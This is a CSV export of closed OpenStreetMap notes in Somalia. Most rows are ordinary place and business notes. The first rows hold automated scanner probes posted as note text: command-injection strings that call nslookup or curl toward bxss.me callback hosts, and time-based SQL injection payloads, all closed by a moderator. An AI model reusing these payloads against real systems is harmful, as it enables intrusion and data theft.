note_id,country_name,latitude,longitude,opened_at,closed_at,days_to_resolution,opened_by_username,opening_comment,total_comments,was_reopened,closed_by_username,closing_comment
4369064,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:33:42,0,Unknown,&nslookup -q=cname hitpeupoykaos9946d.bxss.me&'\'`0&nslookup -q=cname hitpeupoykaos9946d.bxss.me&`',2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369065,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:33:37,0,Unknown,&(nslookup -q=cname hitbbwouupkene0d1b.bxss.me||curl hitbbwouupkene0d1b.bxss.me)&'\'`0&(nslookup -q=cname hitbbwouupkene0d1b.bxss.me||curl hitbbwouupkene0d1b.bxss.me)&`',2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369066,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:33:31,0,Unknown,|(nslookup -q=cname hitfipfcfyvvxff408.bxss.me||curl hitfipfcfyvvxff408.bxss.me),2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369067,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:33:25,0,Unknown,`(nslookup -q=cname hitnrgssisawlb8c26.bxss.me||curl hitnrgssisawlb8c26.bxss.me)`,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369068,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:33:19,0,Unknown,;(nslookup -q=cname hitaiskkmzaoh00054.bxss.me||curl hitaiskkmzaoh00054.bxss.me)|(nslookup -q=cname hitaiskkmzaoh00054.bxss.me||curl hitaiskkmzaoh00054.bxss.me)&(nslookup -q=cname hitaiskkmzaoh00054.bxss.me||curl hitaiskkmzaoh00054.bxss.me),2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369069,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:33:12,0,Unknown,|(nslookup${IFS}-q${IFS}cname${IFS}hitoefaqinnlv693bc.bxss.me||curl${IFS}hitoefaqinnlv693bc.bxss.me),2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369070,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:33:05,0,Unknown,&(nslookup${IFS}-q${IFS}cname${IFS}hitrdiulehfka71c6d.bxss.me||curl${IFS}hitrdiulehfka71c6d.bxss.me)&'\'`0&(nslookup${IFS}-q${IFS}cname${IFS}hitrdiulehfka71c6d.bxss.me||curl${IFS}hitrdiulehfka71c6d.bxss.me)&`',2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369107,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:32:11,0,Unknown,"if(now()=sysdate(),sleep(15),0)",2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369108,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:32:05,0,Unknown,"01/01/19670'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369109,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:32:00,0,Unknown,"01/01/19670'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369110,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:31:53,0,Unknown,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+''+(select(0)from(select(sleep(15)))v)+'*/,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369111,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:31:46,0,Unknown,01/01/1967-1 waitfor delay '0:0:15' --,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369112,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:31:41,0,Unknown,01/01/1967tsy2zq9L'; waitfor delay '0:0:15' --,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369113,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:31:35,0,Unknown,01/01/1967Tvoj8IFB' OR 413=(SELECT 413 FROM PG_SLEEP(15))--,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369114,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:31:29,0,Unknown,01/01/1967D6YyDPPH') OR 447=(SELECT 447 FROM PG_SLEEP(15))--,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369115,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:31:22,0,Unknown,01/01/1967X0EFWXQc')) OR 511=(SELECT 511 FROM PG_SLEEP(15))--,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369116,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:31:15,0,Unknown,"01/01/1967'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'",2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369117,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:31:09,0,Unknown,01/01/1967'',2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369118,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:31:03,0,Unknown,@@4d6gb,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369051,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:29:13,0,Unknown,''(),2,0,mavl,This note does not contain a useful information for OpenStreetMap.
3808517,Soomaaliya الصومال,8.4763349,47.3585647,2023-07-31 00:00:00,2024-07-29 06:41:10,0,Abdulahi Jama hassn,Halgankii Khaatumo iyo kayse kaligi fuul,3,1,updivataax,
4354932,Soomaaliya الصومال,6.9864068,47.1867943,2024-07-28 00:00:00,2024-07-28 09:05:43,0,Abdinasir Ali,Xero Jalle,2,0,Abdinasir Ali,
4354930,Soomaaliya الصومال,6.5564978,47.2841263,2024-07-28 00:00:00,2024-07-28 09:04:51,0,Abdinasir Ali,Dagaari,2,0,Abdinasir Ali,
4354929,Soomaaliya الصومال,6.4809435,46.9452667,2024-07-28 00:00:00,2024-07-28 09:03:46,0,Abdinasir Ali,Bandiradley,2,0,Abdinasir Ali,
4354928,Soomaaliya الصومال,6.6938477,47.3799562,2024-07-28 00:00:00,2024-07-28 09:02:52,0,Abdinasir Ali,Ceelaqwan,2,0,Abdinasir Ali,
4354925,Soomaaliya الصومال,6.7007099,47.3964787,2024-07-28 00:00:00,2024-07-28 09:01:31,0,Abdinasir Ali,Ceelaqwan,3,1,Abdinasir Ali,
4354919,Soomaaliya الصومال,6.7007792,47.3967952,2024-07-28 00:00:00,2024-07-28 09:00:20,0,Abdinasir Ali,Ceelaqwan,3,1,Abdinasir Ali,
4354914,Soomaaliya الصومال,6.5029458,47.1011353,2024-07-28 00:00:00,2024-07-28 08:59:16,0,Abdinasir Ali,Sadax-higlo,2,0,Abdinasir Ali,
4354911,Soomaaliya الصومال,6.6172059,47.0698929,2024-07-28 00:00:00,2024-07-28 08:58:36,0,Abdinasir Ali,Gawlale,2,0,Abdinasir Ali,
4354908,Soomaaliya الصومال,6.7595676,47.0589066,2024-07-28 00:00:00,2024-07-28 08:57:35,0,Abdinasir Ali,Hassa saalle,2,0,Abdinasir Ali,
4354886,Soomaaliya الصومال,6.7050147,47.2266197,2024-07-28 00:00:00,2024-07-28 08:44:15,0,Abdinasir Ali,Qayra dhunte,2,0,Abdinasir Ali,
4354873,Soomaaliya الصومال,6.9848734,46.9559097,2024-07-28 00:00:00,2024-07-28 08:38:11,0,Abdinasir Ali,Jiingada,2,0,Abdinasir Ali,
4354872,Soomaaliya الصومال,6.9998991,46.9791055,2024-07-28 00:00:00,2024-07-28 08:36:42,0,Abdinasir Ali,Biyo Cado,2,0,Abdinasir Ali,
4354870,Soomaaliya الصومال,7.0305136,47.0194244,2024-07-28 00:00:00,2024-07-28 08:36:13,0,Abdinasir Ali,Galdogob town,2,0,Abdinasir Ali,
4354865,Soomaaliya الصومال,6.9013761,47.1248245,2024-07-28 00:00:00,2024-07-28 08:34:29,0,Abdinasir Ali,6.9052112 47.1200485,4,1,Abdinasir Ali,Jicboor
4354863,Soomaaliya الصومال,6.8193440,46.8200290,2024-07-28 00:00:00,2024-07-28 08:32:55,0,Abdinasir Ali,Dalsan,2,0,Abdinasir Ali,
4354860,Soomaaliya الصومال,6.9688567,47.2436142,2024-07-28 00:00:00,2024-07-28 08:31:39,0,Abdinasir Ali,Xero Jalle,2,0,Abdinasir Ali,
4354826,Soomaaliya الصومال,6.3888390,48.9320400,2024-07-28 00:00:00,2024-07-28 08:05:20,0,Abdinasir Ali,Bandarshikh,2,0,Abdinasir Ali,
4354824,Soomaaliya الصومال,6.4980636,48.7222624,2024-07-28 00:00:00,2024-07-28 08:04:36,0,Abdinasir Ali,Qoryowayn,2,0,Abdinasir Ali,
4354823,Soomaaliya الصومال,6.4925360,48.7820780,2024-07-28 00:00:00,2024-07-28 08:03:48,0,Abdinasir Ali,Af barwaqo,2,0,Abdinasir Ali,
4354822,Soomaaliya الصومال,6.7291381,49.2201233,2024-07-28 00:00:00,2024-07-28 08:03:12,0,Abdinasir Ali,Dinowda Qoryowayn,2,0,Abdinasir Ali,
4354818,Soomaaliya الصومال,6.8133880,49.0152880,2024-07-28 00:00:00,2024-07-28 08:02:10,0,Abdinasir Ali,Cawsacado,2,0,Abdinasir Ali,
4354817,Soomaaliya الصومال,6.6146055,48.8753414,2024-07-28 00:00:00,2024-07-28 08:01:23,0,Abdinasir Ali,Xingaras,2,0,Abdinasir Ali,
4354816,Soomaaliya الصومال,6.6182290,48.8752127,2024-07-28 00:00:00,2024-07-28 08:00:49,0,Abdinasir Ali,Towfiiq,4,1,Abdinasir Ali,
4347902,Soomaaliya الصومال,5.9801470,46.3635190,2024-07-24 00:00:00,2024-07-24 06:06:59,0,Abdinasir Ali,"5° 58' 48.5274' N, 46° 21' 48.6696' E",2,0,Abdinasir Ali,
1176235,Soomaaliya الصومال,5.5376783,46.3848138,2017-10-16 00:00:00,2024-07-24 05:46:28,0,Unknown,Office / Xafiiska ururka APCC / APCO Agro-pastoral Charity Organization (APCO),3,1,Abdinasir Ali,
1710457,Soomaaliya الصومال,5.5126953,46.3991097,2019-03-14 00:00:00,2024-07-24 05:46:19,0,Unknown,Dayah,4,1,Abdinasir Ali,
4347874,Soomaaliya الصومال,5.4993116,46.3684901,2024-07-24 00:00:00,2024-07-24 05:44:48,0,Abdinasir Ali,Dhuusamarreeb Airport,3,1,Abdinasir Ali,
4347864,Soomaaliya الصومال,5.5336150,46.3799000,2024-07-24 00:00:00,2024-07-24 05:40:41,0,Abdinasir Ali,"5° 32' 1.1040' N, 46° 22' 47.6394' E",2,0,Abdinasir Ali,
4347862,Soomaaliya الصومال,5.5313938,46.3814020,2024-07-24 00:00:00,2024-07-24 05:40:14,0,Abdinasir Ali,"5° 31' 53.0000' N, 46° 22' 53.0000' E",2,0,Abdinasir Ali,
4347860,Soomaaliya الصومال,5.5377904,46.3826680,2024-07-24 00:00:00,2024-07-24 05:39:25,0,Abdinasir Ali,"5° 32' 16.0944' N, 46° 22' 57.6264' E",2,0,Abdinasir Ali,
4347857,Soomaaliya الصومال,5.5307745,46.3774109,2024-07-24 00:00:00,2024-07-24 05:35:51,0,Abdinasir Ali,"5.530771, 46.377401",2,0,Abdinasir Ali,
4347856,Soomaaliya الصومال,5.4708201,46.3597298,2024-07-24 00:00:00,2024-07-24 05:35:02,0,Abdinasir Ali,5°28′15″N 46°21′35″E,2,0,Abdinasir Ali,
4337134,Soomaaliya الصومال,4.1169500,43.8949400,2024-07-17 00:00:00,2024-07-17 11:23:16,0,Abdinasir Ali,Commissioner Office,4,1,Abdinasir Ali,
4337133,Soomaaliya الصومال,4.1143800,43.8825400,2024-07-17 00:00:00,2024-07-17 11:19:30,0,Abdinasir Ali,Daryeel IDP,2,0,Abdinasir Ali,
4337131,Soomaaliya الصومال,4.1189000,43.8852500,2024-07-17 00:00:00,2024-07-17 11:18:43,0,Abdinasir Ali,Horseed Village,2,0,Abdinasir Ali,
4337129,Soomaaliya الصومال,4.1176000,43.8830000,2024-07-17 00:00:00,2024-07-17 11:17:34,0,Abdinasir Ali,Garasweyne IDP Site,10,1,Abdinasir Ali,
4337126,Soomaaliya الصومال,4.1260000,43.8866000,2024-07-17 00:00:00,2024-07-17 11:13:54,0,Abdinasir Ali,Airstrip,2,0,Abdinasir Ali,
4337119,Soomaaliya الصومال,4.1269399,43.8875484,2024-07-17 00:00:00,2024-07-17 11:09:46,0,Abdinasir Ali,Airstip,5,1,Abdinasir Ali,
4328572,Soomaaliya الصومال,4.6138979,45.2751732,2024-07-11 00:00:00,2024-07-11 07:44:17,0,Moo halane,sds,4,1,Moo halane,
1312799,Soomaaliya الصومال,11.2332229,49.1988158,2018-02-28 00:00:00,2024-07-10 23:42:20,0,Unknown,xalwo hubaal,2,0,msanka,xalwo hubaal
1312801,Soomaaliya الصومال,11.2337596,49.1977215,2018-02-28 00:00:00,2024-07-10 23:41:56,0,Unknown,xalwo hubaal bosaso,6,1,msanka,
614842,Soomaaliya الصومال,11.2870302,51.0790514,2016-07-03 00:00:00,2024-05-29 14:23:24,0,Brian Kong,"The place has gone or never existed. This is an auto-generated note from MAPS.ME application: a user reports a POI that is visible on a map (which can be outdated), but cannot be found on the ground. (OSM data version: 2016-06-01T10:03:02Z) #mapsme",2,0,sheikchilli,no POI here
2037822,Soomaaliya الصومال,9.5380926,44.1240576,2019-12-27 00:00:00,2024-05-29 14:22:37,0,Unknown,Soomaliiland ;),2,0,sheikchilli,no information
1019309,Soomaaliya الصومال,2.0104216,45.2981617,2017-06-04 00:00:00,2024-05-12 23:06:10,0,Mahamad Aidiid,'dg' POI has no name POI types: highway-rest_area OSM data version: 2017-05-11T13:22:09Z  #mapsme,2,0,sheikchilli,likely not true
2985887,Soomaaliya الصومال,2.2502800,44.6911800,2021-12-28 00:00:00,2024-05-06 16:19:18,0,cadnaan,tortoorow,2,0,cronoser,it was already added
75443,Soomaaliya الصومال,11.2789009,49.1545272,2013-11-17 00:00:00,2024-04-27 13:55:14,0,Unknown,Bosaso Airport,3,0,sheikchilli,
4180794,Soomaaliya الصومال,3.1256000,43.6689000,2024-04-03 00:00:00,2024-04-03 13:25:27,0,mallisack,INGOs Village,4,1,mallisack,
2432532,Soomaaliya الصومال,3.1224811,43.6657673,2020-11-19 00:00:00,2024-04-03 12:55:16,0,Unknown,Bushra ibrahim Cali,2,0,mallisack,
439827,Soomaaliya الصومال,2.0397109,45.3346109,2015-09-23 00:00:00,2024-03-30 23:10:40,0,Unknown,Villa Somalia,2,0,Deeqsi,
4141921,Soomaaliya الصومال,2.0319508,45.3104952,2024-03-06 00:00:00,2024-03-30 23:08:46,0,Optosom Eye Care Center,Optosom Eye Care Center,3,1,Deeqsi,
2959564,Soomaaliya الصومال,9.5611000,44.0663800,2021-12-05 00:00:00,2024-03-05 21:11:56,0,Unknown,ibco general trading company,3,1,wacays khalifa,
4133387,Soomaaliya الصومال,2.0394910,45.3010270,2024-02-29 00:00:00,2024-02-29 19:51:02,0,user_20663837,Dilek Restaurant Somalia,4,1,user_20663837,"closing note from deleted account, now contentless"
2931137,Soomaaliya الصومال,0.2819000,41.7147000,2021-11-11 00:00:00,2024-02-22 09:18:13,0,Unknown,QOQANI???,3,0,KIPSINDO,
4115598,Soomaaliya الصومال,9.5627364,44.0662158,2024-02-16 00:00:00,2024-02-20 04:57:55,0,Vision Creative Agency,Damal Restaurant Hargeisa Restaurant Waheen Highway 2 Phone: +252634163224 Web: www.damalrestaurant.com,4,1,Vision Creative Agency,
3606694,Soomaaliya الصومال,10.4259500,45.0025500,2023-03-20 00:00:00,2024-02-18 11:20:29,0,Unknown,AED nearby,2,0,iigmir,done https://www.openstreetmap.org/changeset/147604265
2959565,Soomaaliya الصومال,10.4351200,45.0085200,2021-12-05 00:00:00,2024-02-18 11:20:12,0,Unknown,IBCO general trading clearance,2,0,iigmir,done https://www.openstreetmap.org/changeset/147604265
4115589,Soomaaliya الصومال,9.5758735,44.0346569,2024-02-16 00:00:00,2024-02-16 15:20:07,0,Vision Creative Agency,"SignorebyHD Clothing Shop, Mens' Clothing shop Waafi Mall, Ground Floor Jigjiga Yar Road, Hargeisa Phone: +252634163224 Website: www.signorebyhd.com",4,1,Vision Creative Agency,
4115563,Soomaaliya الصومال,9.5620989,44.0604705,2024-02-16 00:00:00,2024-02-16 15:15:56,0,Unknown,"onosm.org submitted note from a business: Name: Beder Hotel Hargeisa addr:street=Timo Cadde Road addr:city=Hargiesa addr:postcode=09010 Phone number: +252634163224 Website: https://bederhotelhargeisa.com Opening Hours: Sat-Fri 6:30 am-11:00 pm Wheelchair accessibility: limited Category: Hotels Description: Hotel Accepted payment methods: Cash,Visa,Mobile phone,Mastercard delivery=yes delivery:description=$0.8 takeaway=yes takeaway:description=Available always",2,0,Vision Creative Agency,
4111271,Soomaaliya الصومال,4.6596163,47.5163653,2024-02-13 00:00:00,2024-02-13 12:33:40,0,moha hassan,Dear OSM  i have uploaded something to hear and still i don't have to publish here,3,1,moha hassan,
3731089,Soomaaliya الصومال,9.5758828,44.1998749,2023-06-11 00:00:00,2024-02-12 09:46:08,0,Unknown,Marso almuniam and dicoretion From hargeisa somaliland,3,0,Nasra_BRP,
922315,Soomaaliya الصومال,8.4005440,48.4847330,2017-03-10 00:00:00,2024-01-26 09:11:30,0,Don_Adem,Masjid Xaaji Ali (OSM data version: 2016-12-14T16:41:03Z) #mapsme,2,0,NeisBot,"This note has the identical location and text  as note https://osm.org/note/922316  Therefore, it will be closed.  #DuplicateNote #UpdatedDescription #2Chars"
922312,Soomaaliya الصومال,8.4067636,48.4834429,2017-03-10 00:00:00,2024-01-26 09:11:30,0,Don_Adem,Masjid Jaamacah (OSM data version: 2016-12-14T16:41:03Z) #mapsme,2,0,NeisBot,"This note has the identical location and text  as note https://osm.org/note/922317  Therefore, it will be closed.  #DuplicateNote #UpdatedDescription #2Chars"
917848,Soomaaliya الصومال,10.2391070,48.4984020,2017-03-07 00:00:00,2024-01-26 09:11:27,0,Mohamed Nesta,habarshiro (OSM data version: 2017-01-19T15:17:02Z) #mapsme,2,0,NeisBot,"This note has the identical location and text  as note https://osm.org/note/917872  Therefore, it will be closed.  #DuplicateNote #UpdatedDescription #2Chars"
4083968,Soomaaliya الصومال,2.0596210,45.3339589,2024-01-23 00:00:00,2024-01-23 22:17:50,0,MohamedDheeli,Masjid Shiekh Abdi,6,1,MohamedDheeli,
2111688,Soomaaliya الصومال,8.3956832,48.4873201,2020-03-05 00:00:00,2024-01-17 16:19:48,0,abdullahi101,'road labeling is missing' POI has no name POI types: amenity-cafe internet_access-wlan OSM data version: 2019-11-24T01:08:45Z  #mapsme,2,0,NeisBot,"This note has the identical location and text  as note https://osm.org/note/2111614  Therefore, it will be closed.  #DuplicateNote"
2066465,Soomaaliya الصومال,2.0608506,45.3085791,2020-01-23 00:00:00,2024-01-17 16:19:43,0,Suufi,'wasarada Gashandhigga' POI has no name POI types: building OSM data version: 2019-11-24T01:08:45Z  #mapsme,2,0,NeisBot,"This note has the identical location and text  as note https://osm.org/note/2066464  Therefore, it will be closed.  #DuplicateNote"
936246,Soomaaliya الصومال,8.4005440,48.4847330,2017-03-22 00:00:00,2024-01-17 10:38:42,0,Don_Adem,Masjid Xaaji Ali (OSM data version: 2016-12-14T16:41:03Z) #mapsme,2,0,NeisBot,"This note has the identical location and text  as note https://osm.org/note/922315  Therefore, it will be closed.  #DuplicateNote"
927648,Soomaaliya الصومال,8.4011326,48.4861072,2017-03-15 00:00:00,2024-01-17 10:38:42,0,Unknown,Al nasar (OSM data version: 2016-12-14T16:41:03Z) #mapsme,2,0,NeisBot,"This note has the identical location and text  as note https://osm.org/note/921443  Therefore, it will be closed.  #DuplicateNote"
922313,Soomaaliya الصومال,8.4011326,48.4861072,2017-03-10 00:00:00,2024-01-17 10:38:41,0,Don_Adem,Al Nasar (OSM data version: 2016-12-14T16:41:03Z) #mapsme,2,0,NeisBot,"This note has the identical location and text  as note https://osm.org/note/921443  Therefore, it will be closed.  #DuplicateNote"
4059638,Soomaaliya الصومال,2.7751937,45.5871677,2024-01-09 00:00:00,2024-01-09 14:11:43,0,Unknown,CFA 2023,2,0,Ahm Daahir,
4059664,Soomaaliya الصومال,2.7726218,45.4203129,2024-01-09 00:00:00,2024-01-09 14:10:01,0,Ahm Daahir,CFA Training 2022,2,0,Ahm Daahir,
4059655,Soomaaliya الصومال,2.7685067,45.3779984,2024-01-09 00:00:00,2024-01-09 14:08:53,0,Unknown,CFA Training 2023,2,0,Ahm Daahir,
1439411,Soomaaliya الصومال,2.7757081,45.4871750,2018-06-28 00:00:00,2024-01-09 14:08:34,0,Unknown,as loation,3,1,Ahm Daahir,
4059009,Soomaaliya الصومال,8.4776348,47.3610520,2024-01-09 00:00:00,2024-01-09 01:05:48,0,Mowlid19,Abwaan Jaamac Kediye Cilmi Road,2,0,Mowlid19,
4059008,Soomaaliya الصومال,8.4773377,47.3598504,2024-01-09 00:00:00,2024-01-09 01:04:07,0,Mowlid19,Abwaan Jaamac Kediye Cilmi Road,3,1,Mowlid19,
3286557,Soomaaliya الصومال,2.0508725,45.0967205,2022-07-27 00:00:00,2023-12-29 08:08:23,0,user_15552334,add houses in the area near mogadiscvioqishu,2,0,NeisBot,#NothingToDoHere - Reason: The initial user account has been removed or no longer exists
3980223,Soomaaliya الصومال,9.5617330,44.0618030,2023-11-09 00:00:00,2023-12-03 13:26:52,0,Unknown,"onosm.org submitted note from a business: Name: Cafe Miir addr:housenumber=01 addr:street=wadada madax-tooyada addr:city=Hargeisa Phone number: +252634111782 Social Network: https://www.instagram.com/cafe_miir/?igshid=MXhzaXJ6N2thdm41Mw%3D%3D Opening Hours: Morning 7:00 AM To 12:00 PM  Afternoon 4:00 PM To 10:30 PM  Wheelchair accessibility: unknown Category: Cafeteria Description: Cafe  Accepted payment methods: Cash,Mastercard,Mobile phone delivery=yes takeaway=yes",4,1,zadd0,
4013492,Soomaaliya الصومال,9.5616491,44.0622353,2023-12-03 00:00:00,2023-12-03 13:25:55,0,zadd0,university,2,0,zadd0,
3991752,Soomaaliya الصومال,9.5656286,44.0527283,2023-11-17 00:00:00,2023-11-17 21:19:54,0,Hargeisa DRM,Hero awr road,3,1,Hargeisa DRM,
740590,Soomaaliya الصومال,10.4498100,45.0169500,2016-10-07 00:00:00,2023-11-07 10:09:53,0,Unknown,Blocked street:  This error is submitted from Navmii GPS.,2,0,confusedbuffalo,No street here
2951150,Soomaaliya الصومال,10.6130600,47.3741000,2021-11-27 00:00:00,2023-11-06 11:39:01,0,EngAbdiaziz,Gudomiye Ismael Residence,3,0,confusedbuffalo,"Personal note about home, not what public OSM notes should be used for"
1066995,Soomaaliya الصومال,2.8944000,42.2799000,2017-07-16 00:00:00,2023-11-03 14:06:32,0,Unknown,H,2,0,Mateusz Konieczny,closing as old unclear note
1185681,Soomaaliya الصومال,4.8329000,45.2147000,2017-10-26 00:00:00,2023-11-02 19:16:04,0,Unknown,OTP site,2,0,confusedbuffalo,Not enough information to map anything
1181398,Soomaaliya الصومال,4.8859583,45.0671196,2017-10-21 00:00:00,2023-11-02 19:16:02,0,Yerow,Closed OTP site,2,0,confusedbuffalo,Not enough information to map anything
1181396,Soomaaliya الصومال,4.8675425,45.1572985,2017-10-21 00:00:00,2023-11-02 19:16:00,0,Yerow,OTP site,4,0,confusedbuffalo,Not enough information to map anything
1181395,Soomaaliya الصومال,4.8292861,45.2146351,2017-10-21 00:00:00,2023-11-02 19:15:58,0,Yerow,OTP site,2,0,confusedbuffalo,Not enough information to map anything
1181393,Soomaaliya الصومال,4.8234703,45.1696598,2017-10-21 00:00:00,2023-11-02 19:15:56,0,Yerow,OTP site,2,0,confusedbuffalo,Not enough information to map anything
1181392,Soomaaliya الصومال,4.7286646,45.2081321,2017-10-21 00:00:00,2023-11-02 19:15:55,0,Yerow,Hawotako OTP site,2,0,confusedbuffalo,Not enough information to map anything
1181391,Soomaaliya الصومال,4.7512819,45.1880276,2017-10-21 00:00:00,2023-11-02 19:15:53,0,Yerow,OTP site,8,1,confusedbuffalo,Not enough information to map anything
372049,Soomaaliya الصومال,1.7077899,44.7575540,2015-05-29 00:00:00,2023-11-02 05:48:34,0,Unknown,Aw osman,2,0,Practice Version,
1969280,Soomaaliya الصومال,1.7546628,44.5399475,2019-10-21 00:00:00,2023-11-02 05:48:06,0,Unknown,Farxaane,4,1,Practice Version,
2378056,Soomaaliya الصومال,9.5682500,44.0729800,2020-10-08 00:00:00,2023-10-28 20:16:33,0,Unknown,Mohamed_Somali residency,2,0,zluuzki,
2541288,Soomaaliya الصومال,9.5643188,44.1070487,2021-02-16 00:00:00,2023-10-28 20:16:17,0,Unknown,Road 1,2,0,zluuzki,unclear
395319,Soomaaliya الصومال,9.5757492,44.0526760,2015-07-13 00:00:00,2023-10-28 20:16:00,0,Unknown,Khaalid,2,0,zluuzki,unclear
1499547,Soomaaliya الصومال,9.5806236,44.0360436,2018-08-23 00:00:00,2023-10-28 20:15:47,0,Muztahil,Ku,2,0,zluuzki,
2458757,Soomaaliya الصومال,9.5728650,44.0326519,2020-12-10 00:00:00,2023-10-28 20:15:41,0,Soma Isaki,'best centre forjugging and runng and chewing area' POI name: Mafrashka mirqaanka POI types: leisure-fitness_centre internet_access-wlan OSM data version: 2020-09-19T23:20:21Z  #mapsme,2,0,zluuzki,
2458756,Soomaaliya الصومال,9.5733698,44.0386771,2020-12-10 00:00:00,2023-10-28 20:15:40,0,Soma Isaki,'community centre meeting with freinds and chewing qat' POI name: Maqaam Ducaale POI types: amenity-community_centre internet_access-wlan OSM data version: 2020-09-19T23:20:21Z  #mapsme,2,0,zluuzki,
3772106,Soomaaliya الصومال,3.3167600,45.8823700,2023-07-09 00:00:00,2023-10-28 20:15:11,0,Unknown,xalfooleey,2,0,zluuzki,spam
3795881,Soomaaliya الصومال,2.5173000,44.9880000,2023-07-24 00:00:00,2023-10-28 20:14:59,0,Unknown,1,2,0,zluuzki,unclear
3795882,Soomaaliya الصومال,2.4998000,44.9864000,2023-07-24 00:00:00,2023-10-28 20:14:57,0,Unknown,2,2,0,zluuzki,unclear
3795883,Soomaaliya الصومال,2.5377000,44.9943000,2023-07-24 00:00:00,2023-10-28 20:14:55,0,Unknown,3,2,0,zluuzki,unclear
3795887,Soomaaliya الصومال,2.5768000,45.0450000,2023-07-24 00:00:00,2023-10-28 20:14:53,0,Unknown,4,2,0,zluuzki,unclear
3795888,Soomaaliya الصومال,2.5678000,45.0458000,2023-07-24 00:00:00,2023-10-28 20:14:51,0,Unknown,5,2,0,zluuzki,unclear
3795891,Soomaaliya الصومال,2.5520000,45.0302000,2023-07-24 00:00:00,2023-10-28 20:14:49,0,Unknown,6,2,0,zluuzki,unclear
3935894,Soomaaliya الصومال,2.0381172,45.3665734,2023-10-11 00:00:00,2023-10-28 20:14:33,0,Unknown,Rules Hate it Hate it,2,0,zluuzki,spam
2569612,Soomaaliya الصومال,2.0324146,45.3390127,2021-03-07 00:00:00,2023-09-11 06:17:49,0,Unknown,Hamar Wayne,3,1,richard greene,
